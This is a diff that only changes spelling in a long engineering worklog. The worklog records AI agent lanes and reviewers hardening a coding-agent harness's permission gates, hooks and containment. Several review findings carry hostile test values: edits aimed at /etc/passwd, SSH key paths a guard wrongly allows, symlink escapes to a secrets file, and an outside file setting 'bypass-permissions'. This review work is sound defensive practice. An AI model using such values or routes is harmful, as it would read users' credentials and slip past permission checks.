@@ -123,7 +123,7 @@ which means they originated from this working copy — but `.git/hooks/` holds o
 `core.hooksPath` is unset, no cron matches, and no `git push` was issued in this session.
 
 The lesson is procedural, not forensic: **"I did not push" is not evidence that something is unpublished.**
-`git ls-remote` is, and it costs one command. This matters because the push authorisation model in this
+`git ls-remote` is, and it costs one command. This matters because the push authorization model in this
 plan assumes the supervisor controls when work becomes public, and that assumption is false here. Anything
 that must NOT reach GitHub cannot be protected by declining to push it.
 
@@ -156,7 +156,7 @@ sugar-crush `9994 / 144819 / 1`, candy-core `842 / 7573 / 25`, candy-flip `83 / 
 commits FIRST. **35** — when a prediction resolves quietly, prove the instrument is alive before you
 accept the number.
 
-### The round-54 close, in full, because the user authorised the whole sequence
+### The round-54 close, in full, because the user authorized the whole sequence
 
 Merged and verified → pushed → org sync green → `composer update` across all 59 manifests, **every one
 `rc=0`** → closure restored and verified → round 55 launched. The sweep is a genuine end-to-end check
@@ -296,7 +296,7 @@ closes the fd 3+ inheritance the round-53 guard proves (E417/E418/E425/E426). La
 **Standing rule 33 added to `COMMON`:** when a guard offers you an exemption row, ask first whether the
 code is correct — if it is, the classifier is the defect.
 
-**At this round's close the user authorised, in order:** merge → push → wait for the `sugarcraft/*` sync
+**At this round's close the user authorized, in order:** merge → push → wait for the `sugarcraft/*` sync
 and Packagist → `composer update` in the root and every lib dir → **restore the path-repo closure before
 anything is measured again** → launch round 55. The full instruction lives at the top of
 `crush_code_RESUME.md`.
@@ -317,7 +317,7 @@ before the first merge, named lane c's `DescriptorInheritanceGuardTest` against 
 rather than trust it. One failure, that exact pair. The finding was a **false positive**:
 `ChildLifetimeScanner` judged conditionality by brace depth and called a reaper in a generator `finally`
 "runs only inside a nested block". The guard offered an exemption row; taking it would have written a
-licence for correct code. The classifier learned `finally` instead, pinned in both polarities and
+license for correct code. The classifier learned `finally` instead, pinned in both polarities and
 mutation-checked (dropping the arm reds 2 tests). **New standing rule 33.**
 
 **Two lanes' work survived two session kills.** Lane b was killed mid-edit holding 107 uncommitted
@@ -749,7 +749,7 @@ the `../candy-*` path repos. So: one tree, disjoint lanes.
    quiet window.
 
 **Sixth hazard, found the hard way (2026-08-14): reads cross lanes even though
-writes do not.** Lane D documents behaviour by reading source, and in wave 1 it
+writes do not.** Lane D documents behavior by reading source, and in wave 1 it
 read lane W's *uncommitted, unreviewed* P1.2 work mid-flight — then documented
 `PermissionGateHook`, `ScriptHook` exit codes and `CANDY_CODE_PERMISSION_MODE`
 as shipped fact. Ownership stops lanes clobbering each other; it does **not**
@@ -1125,12 +1125,12 @@ back green** — narrowing `SEPARATOR` didn't fail because `format()` reads the
 same constant, so it re-ran with a fullwidth separator to prove the
 `Width::string` change is genuinely load-bearing.
 
-Two judgement calls it made that I'd have made: it declined to bound the hunk
-regex to `\d{1,9}` (an unrecognised `@@` falls through to the context branch, so
+Two judgment calls it made that I'd have made: it declined to bound the hunk
+regex to `\d{1,9}` (an unrecognized `@@` falls through to the context branch, so
 a bounded regex would let the *previous* hunk's counters keep advancing — trading
 a crash for silently wrong numbers) and instead opted out of *numbering* only.
 And it fixed `styleDiffLine()`'s twin ambiguity rather than documenting it,
-because leaving it would have made the gutter say "deleted line" while the colour
+because leaving it would have made the gutter say "deleted line" while the color
 said "file header" **on the same row** — a new inconsistency created by its own
 fix.
 
@@ -1235,7 +1235,7 @@ write tool whatever the arguments, so the gate asks on pass 1 and there is never
 a pass 2.
 
 ```
-hooks: sanitiser (Edit{file_path:"/etc/passwd"} -> Edit{file_path:"./build/out.txt"})
+hooks: sanitizer (Edit{file_path:"/etc/passwd"} -> Edit{file_path:"./build/out.txt"})
        permission-gate (PermissionMode::Default)
 executeHooks()       => action=ask, modifiedInput = NULL     <-- rewrite gone
 resolveAsk(approved) => action=allow, rewrittenArgs() = NULL
@@ -1266,7 +1266,7 @@ the change-set explicitly claims are aligned settle on different arguments, and
 
 - `determineExitCode()` reverts **wholesale** to its pre-round-4 body with the
   suite green (1170/3010). The `&& !$result->isAsk()` guard is the only
-  behavioural content of round 4's fix and is load-bearing: `ScriptHook.php:183`
+  behavioral content of round 4's fix and is load-bearing: `ScriptHook.php:183`
   builds an ASK from raw stdout, so a script printing `[exit-1] Proceed?` yields
   an ASK whose message starts with `[exit-1]` — without the guard the dispatch
   proceeds as if nothing was asked.
@@ -1282,7 +1282,7 @@ the change-set explicitly claims are aligned settle on different arguments, and
 top-level JSON list `rewrittenArgs()` exists to refuse — the approver is shown a
 call that will not run, the inverse of round 3's invariant. And
 `Chat::applyRewrite()` lost its `isModified()` gate while `Runtime` kept one, so
-a plain ALLOW carrying a `modifiedInput` is now honoured by Chat and ignored by
+a plain ALLOW carrying a `modifiedInput` is now honored by Chat and ignored by
 Runtime, against `gateToolCall()`'s promise that the two mirror each other
 decision for decision.
 
@@ -1290,7 +1290,7 @@ decision for decision.
 
 A (the `scan()` rule change) **cannot smuggle** — the winning rewrite is always
 re-scanned by the whole chain including the gate before it can settle, so making
-a later hook's rewrite win only ever exposes it to more judgement. The
+a later hook's rewrite win only ever exposes it to more judgment. The
 `$pendingInertModify` fallback cannot loop (the inert branch returns
 unconditionally, consuming no budget). `executeHooks()` has exactly two callers,
 both in `HookManager`, so nothing depended on the old rule.
@@ -1380,8 +1380,8 @@ to believe the class is closed rather than the next variant merely unfound.
 **The lesson for the remaining queue:** when two consecutive rounds find the same
 *shape* of bug by different routes, stop fixing routes. The cheap fix in round 6
 was a one-liner; the fix agent measured that it closed the fail-open by
-*silently discarding the sanitisation* — the same harm, one layer down — and took
-the structural option instead. That judgement is what ended the chain.
+*silently discarding the sanitization* — the same harm, one layer down — and took
+the structural option instead. That judgment is what ended the chain.
 
 ### What kept paying
 
@@ -1563,7 +1563,7 @@ the repo's shell runs mid-session with no relaunch and no prompt. Created by
 this change-set: before #15/#16 nothing read those files, so writing them was
 inert.
 
-**Round 5's fix used two independent defences**, because a substring match on a
+**Round 5's fix used two independent defenses**, because a substring match on a
 Bash command is not a boundary:
 - *Write side* — policy files and the agents dir join the protected patterns,
   matched against both the given spelling and the canonical path (resolving the
@@ -1605,7 +1605,7 @@ in-process manager. Three should-fixes survived:
 **Round 6 verification: COMMIT.** Re-derived all four comment claims from source
 rather than from report — including compiling both regex strings to prove the
 `DELIMITERS` correction right — re-ran five sabotage mutations (all RED), and
-confirmed the `Read` carve-out is exactly `=== 'Read'` on the normalised name so
+confirmed the `Read` carve-out is exactly `=== 'Read'` on the normalized name so
 it leaks to nothing like `ReadFile` or `mcp__fs__Read`. Caught that the fix
 agent's own summary table had one cell backwards (the backtrack case was `allow`
 before, not `BLOCK`) — prose error, not code.
@@ -1799,7 +1799,7 @@ candy-core-only soak. Lane B derived the real token model from <!-- @rename-keep
 must be recorded portably rather than spent on assertions.
 
 Related trap, flagged to lane B: assertions that hold only because *upstream* is
-the renderer must be **labelled**, never removed. `Set Shell` is the clear case —
+the renderer must be **labeled**, never removed. `Set Shell` is the clear case —
 a candy-vcr concept that upstream validates against nine fixed keys, where `sh`
 is a hard error aborting the whole job (which is why the escape cases weaponise
 it). Forbidding it in a tape is right today and wrong the day candy-vcr takes
@@ -1829,7 +1829,7 @@ A reachability test proves the door opens, not that the room is habitable.
   round and removed a shipped falsehood.
 - **When a fix agent reports a divergence from its own brief, that is signal, not
   noise.** Lane B's round-8 agent found a sixth divergence and argued for
-  implementing the brief anyway; that judgement is reviewable precisely because
+  implementing the brief anyway; that judgment is reviewable precisely because
   it was surfaced.
 - **Do the cheap closing fixes in-context rather than spawning an agent.** Lane
   A's blocker was a fully-specified comment rewrite; doing it directly saved a
@@ -1947,7 +1947,7 @@ Two more that only became reachable *because* of the wiring: `/workflow run`
 reset `Program`'s SIGINT handler to `SIG_DFL` permanently (so a later `kill
 -INT` skips PHP shutdown and leaves the terminal raw inside the alt screen —
 and the docblock claimed nothing leaked past `run()`, with the async half of
-that claim honoured, which is what hid the broken half); and `stages: nope`
+that claim honored, which is what hid the broken half); and `stages: nope`
 loaded as a valid zero-stage workflow reporting **"Workflow completed"** having
 run nothing.
 
@@ -2132,17 +2132,17 @@ sweep having had the right domain.
 It left the differential harness behind with its numbers — 73,920 generated
 tapes, 24,846 parsing clean, **0 miss-direction divergences against the fixed
 model and 156 against a reconstructed round-9 model** — specifically so a rebuild
-scoring 0 against *both* is recognisable as broken rather than as passing.
+scoring 0 against *both* is recognizable as broken rather than as passing.
 
 **On the candy-vcr point** (raised mid-session by the user): upstream vhs is a
 **transitional** dependency and candy-vcr is meant to replace it outright, but CI
 still renders the ~49-lib matrix with upstream while candy-vcr is a
-candy-core-only non-blocking soak. Round 11 verified the successor's behaviour <!-- @rename-keep historical provenance -->
+candy-core-only non-blocking soak. Round 11 verified the successor's behavior <!-- @rename-keep historical provenance -->
 from `candy-vcr/src/Tape/` **source** rather than assuming, and documented that
 `Set Shell "sh"` is **legal** there (`Compiler` records the name,
 `TapeToGif::resolveShell()` prefers `--shell`, `FrameStream` runs it under a PTY)
 — so the day candy-vcr renders, these lexer regression tests need a different
-sentinel. `GRID_ROWS_BY_HEIGHT` is labelled *unverified-post-switch* rather than
+sentinel. `GRID_ROWS_BY_HEIGHT` is labeled *unverified-post-switch* rather than
 wrong, since those rows were measured in upstream's headless browser. Nothing
 weakened, nothing removed. See **#81**.
 
@@ -2222,7 +2222,7 @@ not by itself make #13's gate claim true. Documented as a README limitation.
 today is line-oriented with **no JSON token and no regex token** — i.e. vulnerable
 to all five `#`-hiding constructs. The grammar was derived from the Go source this
 session; record it portably rather than spending it on assertions. Related trap:
-assertions that hold only because *upstream* is the renderer must be **labelled**,
+assertions that hold only because *upstream* is the renderer must be **labeled**,
 never removed.
 
 **#82** `src/Tui/Components/MenuBar.php:362-368` has the same orphaned-docblock
@@ -2494,7 +2494,7 @@ also opens an overlay; `Ctrl+Tab`/`Ctrl+Shift+Tab` return above the yield check)
 `handleCtrl()` has no undocumented *reachable* chord; the `$keyHelpMaxOffset`
 ceiling is right in every ordering; F3/F4/F5/F6/F7/F9/F10/F11 all verified, with
 **140 derived** as 14 widths ≥5 × 10 heights ≥5 and the floor confirmed
-behaviourally exact at 648 sizes; each of the four `(or k / j)` rows now fails
+behaviorally exact at 648 sizes; each of the four `(or k / j)` rows now fails
 **individually** when reverted, closing the original defect. TUI invariants
 re-derived: 9,108 renders (plain/palette/perm × cols 1–130 × rows 1–45, top and
 clamped-to-end) → 0 violations; 1,296 exhaustive renders (cols 1–72 × rows 1–9) →
@@ -2706,7 +2706,7 @@ cannot contain `em`/`px`/`ms`). In all three the probe was right.
 
 Corollary that is now a standing rule for this file: **when you restate a measured
 figure, restate the domain it was measured over.** Round 12's finding exists
-because "0 miss-direction divergences" travelled without its corpus.
+because "0 miss-direction divergences" traveled without its corpus.
 
 
 ---
@@ -2916,7 +2916,7 @@ into a regex character class, where `[-%` would form a reversed range.
 
 All four findings and five nits closed. Two of the four were resolved by *measuring
 the alternative* rather than by applying the obvious remedy, and in both cases the
-measurement is what justified keeping the current behaviour.
+measurement is what justified keeping the current behavior.
 
 ### F-A1 — the criterion had two conditions, not one
 
@@ -2950,7 +2950,7 @@ alternative is worse rather than better. Sabotage S1 (adding `yieldsToShellReaso
 `chat.palette`) turns **4** tests red, so the collision is real and documented rather
 than hidden. The residual gap is named in the docblock under a
 `── the gap this leaves open (tracker #85) ──` heading with all three measured states,
-and `testTheAgentViewTakesAPaletteItNeitherPaintsNorDrives()` pins current behaviour so
+and `testTheAgentViewTakesAPaletteItNeitherPaintsNorDrives()` pins current behavior so
 that the day it is fixed, a test says so.
 
 ### F-A2 — dormant guard documented, not deleted and not faked
@@ -2989,9 +2989,9 @@ chain) → red, catching a reorder the existing precedence test does not.
 
 ### Nits
 
-- **N1** comment was inverted. Fixed to measured behaviour (`E` / `E S` / `En S` at cols
+- **N1** comment was inverted. Fixed to measured behavior (`E` / `E S` / `En S` at cols
   5/7/8), and the counterfactual measured too: `Style::width()` **truncates**, so
-  dropping the cap loses the description entirely rather than wrapping. Behaviour kept,
+  dropping the cap loses the description entirely rather than wrapping. Behavior kept,
   reason stated, tested.
 - **N2** `KEY_HELP_CHROME_COLS` made checkable — box width `=== min(64, cols-chrome) +
   chrome` at 6 widths.
@@ -3135,7 +3135,7 @@ numbers stages 1-based (0 grep hits).
    line at launch.
 2. **"Drops the tier rather than emptying it" is documented three times, pinned zero
    times.** Sabotage making a refused directory vanish from *both* tiers leaves 815 tests
-   green. The behaviour is real; it is unmeasured.
+   green. The behavior is real; it is unmeasured.
 3. **The dangling-link allowance is a two-syscall check**, so "nothing is behind it" holds
    per-instant, not across the call — proven structurally (grant, then create the target,
    then `baseNames(confine: true)` returns the entry). The reviewer **could not win the
@@ -3238,9 +3238,9 @@ is exactly that 192-byte set **restricted to `< 0x80`** — the 128 high bytes a
 although each is a one-byte ILLEGAL token, lexically identical to `}`, which *is* in the
 list. Confirmed against the binary: `Set Padding \x80Output x.gif` → `validate` exit 0.
 
-**F4 is the third time in this chain that a figure travelled without its domain** — and the
+**F4 is the third time in this chain that a figure traveled without its domain** — and the
 docblock carrying it is the one that names exactly that as round 12's root cause. No
-behavioural impact; corpus A shows the model handles all 255 bytes correctly.
+behavioral impact; corpus A shows the model handles all 255 bytes correctly.
 
 ### Nits
 
@@ -3285,7 +3285,7 @@ uncovered and the docblock saying so.
 
 ## Lane E (#38) — review: 6 findings + 6 nits, every one a test-domain or claim defect
 
-The reviewed *behaviour* is largely correct. What failed is the pinning and the prose — the
+The reviewed *behavior* is largely correct. What failed is the pinning and the prose — the
 same split lanes B and D landed on in the same round.
 
 ### F1 (HIGH) — "answered by a NO-OP" cannot see the effect channel this class actually uses
@@ -3365,7 +3365,7 @@ deleting the guard, and dropping *every* stamped ASK — each turns exactly **on
 the one that hand-builds the `Msg`. So "the one way this state is reachable through the front
 door" has no producer, and the pinning test's domain is structurally incapable of saying so.
 
-**The guard stays** — it is correct dormant defence for the engine path, and the fix is to say
+**The guard stays** — it is correct dormant defense for the engine path, and the fix is to say
 that plainly, exactly as F-A2 did for `shellOwnsKeyboard()`'s unobservable conjunct. The cue
 is the real protection, and the review confirms the cue works.
 
@@ -3419,7 +3419,7 @@ pinned (collapsing it turns 9 tests red).
 Lane B's F4 (a printable-ASCII figure presented as the whole byte space), lane D's Finding 3
 (a "the one path that does X" claim with nine live counter-examples), and lane E's F3/F6 (an
 invented call-site count and a guard with no producer) are the same defect: **a number or a
-claim that travelled without its domain.** All three lanes are now briefed to state the
+claim that traveled without its domain.** All three lanes are now briefed to state the
 domain beside every figure in the code itself, not only in the report.
 
 ---
@@ -3484,7 +3484,7 @@ anything from any lane.
    other lanes' work is **uncommitted in the tree** and must not be touched, reverted or
    tidied.
 2. **Suite totals are usable again.** For the first time this session a full run at 0 failures
-   is a real check rather than a moving target. Per-sabotage judgement is still by the targeted
+   is a real check rather than a moving target. Per-sabotage judgment is still by the targeted
    test file flipping green→red — that rule does not relax.
 
 ## Lane E (#38) landed — and the Chat.php hunk split that made it committable
@@ -3504,7 +3504,7 @@ clean at a line boundary:
 - **lane E**, 9 hunks, all at new-file line `< 3700`: the `$keyHelp` constructor
   member (`+554`), the F6 permission prose (`+697`), the "cannot both be open"
   arm (`+850`), the generation guard (`+1024`), the wheel-drives-the-reference
-  branch (`+2526`), `keyHelp` in the serialised state (`+3251`), and the
+  branch (`+2526`), `keyHelp` in the serialized state (`+3251`), and the
   `/keys`-or-`/help` exact-match command (`+3338`).
 - **lane D**, 3 hunks, all `>= 3787`: the `#79` synchronous-freeze gap docblock,
   the `isFailure()`/`firstFailure()` failure reporting, and the two-tier
@@ -3555,7 +3555,7 @@ It also declined twice to restate a figure it could not reproduce — dropping t
 reviewer's "23.8 µs" outright, and replacing a full-suite claim it could not
 verify with a bound it could (only 3 test files can construct a
 `PermissionRequestMsg`; 252 tests, exactly 1 red per mutation). That is the
-behaviour the standing domain rule is meant to produce.
+behavior the standing domain rule is meant to produce.
 
 And it caught a bad needle in my own brief: `'session picker'` cannot be the
 picker's signature, because the reference screen documents the row *"Open the
@@ -3574,7 +3574,7 @@ my paraphrase — 2525–2648 for D, 2649–2756 for B, 2757–2897 for the roun
 just fixed.
 
 One collision to watch: if the lane E review demands a Chat.php fix, that fix
-and lane D's `>= 3780` hunks touch the same file. Serialise those two rather
+and lane D's `>= 3780` hunks touch the same file. Serialize those two rather
 than running them together.
 
 ## Lane B (#37) round 15 landed as `48e0690c` — and the brief was stale in four places
@@ -3636,7 +3636,7 @@ sibling lanes, so a single suite number from it is a snapshot. It measured
 `Integration/BinSugarcrushWiringTest` (passes in isolation, both it and
 `Cli/Bootstrap.php` modified by that lane). Not lane E's.
 
-### The three that are behaviour, not prose
+### The three that are behavior, not prose
 
 **F-1 (HIGH)** — `menu.switch`'s `←` and its `h` alternate are advertised by the
 new reference and pinned by **nothing in the lib**. `KeyBindingDriftTest:738-743`
@@ -3845,7 +3845,7 @@ leaves a lone `?` untypeable**, because `?` itself would go on closing without
 typing; and gating the open needs a signal separating "about to compose" from
 "about to read", which does not exist — the two states are byte-identical.
 
-**F-1 generalised past its brief.** The wrap-satisfies-either-direction hole was
+**F-1 generalized past its brief.** The wrap-satisfies-either-direction hole was
 not only `menu.switch`: the same weakness was in `palette.move` (9 rows) and
 `chat.slash-menu` (17), while seven other rows were already asymmetric.
 
@@ -3855,7 +3855,7 @@ presses in those states silently became ordinary-pane presses and pulled
 `shellCtrlRunes()` into the histogram (712/48 → 692/68). Rebuilt per press, reason
 recorded inline.
 
-Divergences it reported rather than complying with: arrow-labelled rows are **8**,
+Divergences it reported rather than complying with: arrow-labeled rows are **8**,
 not the 7 the brief said; the reviewer's "73–94" **is** reproducible but only under
 a per-character PUA strip nothing in the lib uses (the two real instruments give
 77–98 raw and 54–75 stripped, so the conclusion stands and the figure now names its
@@ -3877,7 +3877,7 @@ briefed to read their round's findings out of this worklog — 3102-onward for E
 2649-2756 for B — rather than from a paraphrase.
 
 Five rounds running, the dominant defect class has been **a number or a claim that
-travelled without its domain**, and it has appeared inside the fix rounds meant to
+traveled without its domain**, and it has appeared inside the fix rounds meant to
 remove it every single time. Both briefs make that an explicit attack line.
 
 ## RESUMPTION STATE — 2026-08-17, safe `/compact` point
@@ -3927,11 +3927,11 @@ Two ADVERSARIAL REVIEWERS, both read-only, both told to report and stop:
 
 - **lane E round-2 review** — **REPORTED**, findings written up at the end of this
   file. Six findings, one HIGH: the round replaced a false `/keys` mitigation with a
-  different false `/keys` mitigation. Behaviour of the `?` decision itself held under
+  different false `/keys` mitigation. Behavior of the `?` decision itself held under
   keystroke-level driving.
 - **lane B round-15 review** — **REPORTED**, findings written up at the end of this
   file. Four findings, one MEDIUM (a third kind-vs-text gate, unpinned, in the same
-  method the round was fixing). Behaviour clean; the model held against three
+  method the round was fixing). Behavior clean; the model held against three
   reviewer-built corpora and a rebuilt Go oracle.
 
 If either notification is lost, both rounds are re-runnable from the worklog
@@ -3949,7 +3949,7 @@ sections named in their briefs.
 **Sequencing constraint: #14 and #12 both want `src/Cli/Bootstrap.php`** — #14 to
 wire the loader, #12 to add `mcpClient()`. Run them ONE AT A TIME. Two files needed
 hunk-level splitting today for exactly this reason (`Chat.php` for lane D vs E,
-`README.md` likewise), and splitting is avoidable by serialising.
+`README.md` likewise), and splitting is avoidable by serializing.
 
 **#63** (`enforceTimeLimit` in `phpunit.xml`) should be slotted into the next gap
 where no agent is running the suite — it has been waiting only for that.
@@ -4002,7 +4002,7 @@ that way until their fix rounds review clean.
 ### Method notes worth carrying forward
 
 - **The dominant defect class, now SIX rounds running, is a number or a claim that
-  travelled without its domain** — and it has appeared inside the fix round meant
+  traveled without its domain** — and it has appeared inside the fix round meant
   to remove it EVERY time. Every figure written into code must state what it was
   measured over, in the code. Lane B round 15 is the sharpest instance yet: it
   closed two kind-vs-text gates and left a third unpinned three lines below, then
@@ -4032,7 +4032,7 @@ that way until their fix rounds review clean.
 Reviewer verdict on `48e0690c` + `de15ee6d`'s header edit: *"the model is the
 strongest thing in this chain so far"* — it built its own Go oracle and three
 corpora of its own design and could not make the model lose a directive. All four
-findings are in the CLAIMS and the PINNING, not the behaviour. One matters.
+findings are in the CLAIMS and the PINNING, not the behavior. One matters.
 
 Baseline reproduced exactly: **6418 / 49631 / 0 failures / 1 skipped** in 1m51s,
 the skip being the legitimate `McpClientTest` one, and `SystemPromptWiringTest`
@@ -4073,7 +4073,7 @@ and `0x40` (`@`).
 `:2299-2302` describes the SAME named domain correctly ("`0x40` is the only value
 divergence that is neither a `#` nor the UTF-8 residual"). So the file holds the
 right measurement and a contradicting zero. In a paragraph that opens "No
-behavioural claim changed here".
+behavioral claim changed here".
 
 ### F-3 [LOW] — "printable-ASCII" ≠ "< 0x80", at three sites
 
@@ -4183,7 +4183,7 @@ silently ships `why/keys` to the backend as a prompt; and **there is no state in
 which `/keys` works and `?` does not** — once the draft clears, `?` works.
 
 `/keys`/`/help` remain justified as discoverable command NAMES (the
-`CommandRegistry` comment's behaviour argument is sound), so they stay. It is the
+`CommandRegistry` comment's behavior argument is sound), so they stay. It is the
 two sentences that are false. **This is the same defect class the previous round's
 F-4 was raised for, reappearing in a new sentence** — someone reasoned about
 `submit()` instead of typing into it.
@@ -4275,7 +4275,7 @@ not `70 − 27 = 43`.
   the `/` popup types `/?`; `?` with the palette open filters to `'?'`. Both
   directions pinned: dropping the insert → 2 failures; making the FIRST `?` type
   → 4 + 1.
-- **F-1's generalisation.** Every direction pair mutated both ways. SWAP is caught
+- **F-1's generalization.** Every direction pair mutated both ways. SWAP is caught
   for all nine `*.move`/`*.switch`/`*.page`/`session-cycle` rows; first-direction
   DELETION is caught for eight of them. The one exception is `agents.move`'s `↑`
   (the observation "up leaves −1" is also satisfied by an unbound key) — but
@@ -4297,7 +4297,7 @@ not `70 − 27 = 43`.
 
 Reviewer spent ~2h on `c2ab3e31`: re-measured every figure, built fixture repos to
 break both containment tiers for real, drove `/workflow` end-to-end through a real
-`Bootstrap::chat()`, mutation-tested seven behaviours. Baseline reproduced exactly:
+`Bootstrap::chat()`, mutation-tested seven behaviors. Baseline reproduced exactly:
 6418 / 49631 / 0 failures / 1 skipped, 1m50s.
 
 ### F-1 [HIGH] — `AgentPresetRegistry` is a third, LIVE instance of the escape this round closed twice
@@ -4316,7 +4316,7 @@ every frontmatter-bearing `*.md` in the target is parsed as a preset:
 
 The file's `description` becomes a roster entry, its body becomes the sub-agent's
 `initialPrompt`, and **`permissionMode: bypass-permissions` out of a file the
-repository does not contain is honoured.** This is the identical relocatable-boundary
+repository does not contain is honored.** This is the identical relocatable-boundary
 bug `readableProjectDir()` and `skillFilesIn()` now refuse — in a subsystem the
 round's own docblocks describe as sharing the trust model.
 
@@ -4426,7 +4426,7 @@ exists the directory is refused. A claim defect, not a live escape.
 - **The per-mode refusal table is exactly right**, measured over 6 modes × 11 tool
   names including `Skill`/`doctor`/`mcp__git__push`.
 - **Workflow containment: 18 escape attempts, 0 wins** — `-> ..`, `-> outside`,
-  `-> .`, `-> tools/workflows` (honoured, correctly), dangling, entry-level
+  `-> .`, `-> tools/workflows` (honored, correctly), dangling, entry-level
   `leak.yaml -> outside`, `sneak.yaml -> <root>/local-secrets.yaml`, trailing slash,
   `//`, `../` traversal, root spelled `/`- and `/./`-suffixed, `projectRoot: null`,
   symlinked checkout root, `projectRoot: ''`.
@@ -4468,7 +4468,7 @@ exists the directory is refused. A claim defect, not a live escape.
 No earlier lane D verdict was WRONG, but one was **narrower than it reads**, and that
 is what let F-1 and F-2 survive five rounds. Round 4's "the anchor is un-forgeable (a
 repo can move `$projectWorkflowsPath`, never `$projectRoot`)" is true of the workflow
-tier and does not generalise: the same sentence is false for `AgentPresetRegistry`,
+tier and does not generalize: the same sentence is false for `AgentPresetRegistry`,
 where the search path IS the forgeable thing and there is no anchor at all. Rounds 3-5
 took the containment inventory **per lane-scope file** and never package-wide.
 
@@ -4504,7 +4504,7 @@ round-2 review", lane D at "Lane D round-5 review".
 **Every brief carries the six-rounds rule as an explicit failure condition**: every
 figure must be one the agent measured this session with its domain stated in the
 code; every "the only X" claim must be backed by a repo-wide sweep; every
-behavioural claim about keystrokes must be DRIVEN, not reasoned about. Lane E's F-1
+behavioral claim about keystrokes must be DRIVEN, not reasoned about. Lane E's F-1
 exists precisely because someone reasoned about `submit()` instead of typing into it.
 
 **#63** (`enforceTimeLimit` in `phpunit.xml`) still waits for a gap when NO agent is
@@ -4596,7 +4596,7 @@ exist". Dropping one conjunct at `:3025` makes `false < int` true, `$end` become
 `$i` walk backwards, and `tokenize()` loop **forever** on `Type "echo abc` — a shape
 the suite already contains. 8s hard timeout, no progress; it killed the reviewer's
 first sweep pass at 10 minutes. The narrow arm-deletion claim holds; the
-generalisation does not, and round 14's "0 hangs" was scoped to arm deletions.
+generalization does not, and round 14's "0 hangs" was scoped to arm deletions.
 
 ### F6 [LOW] — the history evidence is vacuous
 
@@ -5012,7 +5012,7 @@ Lane E's equivalent move:
 count, each owning method, and that the four blocks are textually identical — because
 narrating a line number is exactly what failed in round 3. Its honest side effect is
 recorded: that pin reds on ANY row of the mutation table (it reads the guard's text
-back), so the table's trio column counts behavioural reds only and says so.
+back), so the table's trio column counts behavioral reds only and says so.
 
 ### Lane E round 4 fixed the CODE, not the claim
 
@@ -5200,7 +5200,7 @@ Both halves of the "gate each candidate vs. don't walk at all" question were
 implemented, and the difference measured rather than assumed: the candidate gate
 stops **disclosure**; the start gate stops a directory outside the repository
 deciding which of the repository's OWN instruction files governs a touched path —
-a **control** escape, not a disclosure, and labelled as such in the code.
+a **control** escape, not a disclosure, and labeled as such in the code.
 
 ### #90 was a prerequisite, not a nicety — the census is why
 
@@ -5365,7 +5365,7 @@ This is the round's real theme. FOUR "derived" instruments measured presence:
 - **`ProjectTierRefusalInventoryTest` asserted that a five-element literal has five
   elements**, while both missing tier names were already `true` in its own
   haystack. Replaced with a `token_get_all` derivation: 20 dot-paths, 10
-  repository-chosen. Classification stays a written-down judgement, because a
+  repository-chosen. Classification stays a written-down judgment, because a
   string literal cannot say who chose the location.
 - **`BuiltInToolCorpus` derived one class per FILENAME** while `src/` ships **286
   top-level declarations in 267 files**. Now scans every declaration. Separately:
@@ -5468,7 +5468,7 @@ command that reaches it in **two keystrokes**.
 
 Lane E round 7 was told explicitly NOT to change the routing — where `y`/`n`/`a`
 should be accepted from is a design decision — but to correct every in-code claim
-to what is measured, pin current behaviour (including the `a` → persistent-grant
+to what is measured, pin current behavior (including the `a` → persistent-grant
 case), and return **fix options with measured costs**. Pick one next session.
 
 Two corrections to earlier records: it answers on the **fourth** keystroke of
@@ -5713,7 +5713,7 @@ the same file.
    `src/Commands/KeyBindingRegistry.php`, `tests/Renderer/KeyHelpTest.php`,
    possibly `README.md`. If it died, re-issue from the design above — it is
    complete enough to re-brief from.
-2. Re-issue the two stopped reviews (briefs summarised above).
+2. Re-issue the two stopped reviews (briefs summarized above).
 3. **#88** README whole-suite figure, standalone. Deferred a FIFTH time. At
    `f0d95785` the true value is **6678 / 69298 / 1 skipped** — re-measure after
    round 8 lands, since it moves the count.
@@ -5748,7 +5748,7 @@ are explained: lane B round 21 was editing that file concurrently.** That is
 standing rule 4 (never edit a file while a run of it is in flight, because it
 shifts `file(__FILE__)` ranges against already-loaded reflection). Not a defect,
 and not unexplained — but it does mean two lanes were allowed to overlap on one
-file's *runs* even though they never overlapped on its *writes*. Serialise the
+file's *runs* even though they never overlapped on its *writes*. Serialize the
 suite runs, not just the edits.
 
 Queue item 1 above is now closed. Items 2–5 stand; #88's figure is **6678 / 69306
@@ -5828,7 +5828,7 @@ The COPY escape is genuinely closed in both directions — that part confirms.
 
 ### F4 — MODERATE. `patternStaysInside()` claims the Windows domain and fails it
 
-Normalises `\`→`/` as a separator but tests absoluteness on the raw string with
+Normalizes `\`→`/` as a separator but tests absoluteness on the raw string with
 `str_starts_with($pattern, '/')`. `\etc\passwd`, `C:\Users\victim\.ssh\id_rsa`,
 `C:/Users/x` and bare `\` are all **ALLOWED**; `/etc/passwd` refused. Matters because
 the doc-block argues the lexical pattern guard is the DURABLE one against
@@ -6376,7 +6376,7 @@ and 5.5 both need `src/Chat.php` (the `REMINDER_TOKEN_LIMIT` const and the
 file-disjoint second lane is unsafe here: the rule learned earlier in this chain is
 that a *suite run* which loads a file another lane is editing shifts
 `file(__FILE__)` ranges against already-loaded reflection and produces phantom
-failures. Serialise the suite runs, not just the writes.
+failures. Serialize the suite runs, not just the writes.
 
 A genuinely disjoint sub-bundle exists if parallelism is ever needed: **5.1 + 5.2**
 touch only `src/Runtime.php` and `src/Tools/*`. 5.1 is also the plan's own
@@ -6488,7 +6488,7 @@ a default (`Chat.php:536`) on a fixture that never scrolled. Fixture now arrives
 with all three non-default and asserts each *before* `/clear`. The two clauses that
 were already true are recorded so they are not re-litigated: token counters really
 are derived (`estimateTokenCount()` recomputes over `$history`; no stored field),
-and an in-flight turn really is not cancelled (the `if ($this->inFlight)` guard
+and an in-flight turn really is not canceled (the `if ($this->inFlight)` guard
 precedes the Enter arm).
 
 #### F3 — bare `/agent` is not a command at all
@@ -6550,7 +6550,7 @@ worth building rather than trusting running notes:**
    widest declared row (`Renderer.php:556`); the constant at `:562` is **64**. Five
    columns of headroom, nothing can truncate. Stale prose, not a rendering risk.
 3. **`Agent::fromPreset()`'s dropped-field set has three different values** —
-   worklog 7, code docblock 5, constructor at HEAD **8 behavioural + 2 more**. All
+   worklog 7, code docblock 5, constructor at HEAD **8 behavioral + 2 more**. All
    three recorded, measured set flagged authoritative.
 4. **`TerminalBackground::observe()` and the `Write` tool are already wired**,
    contradicting `crush_code.md`'s status block — the plan overstates what is left.
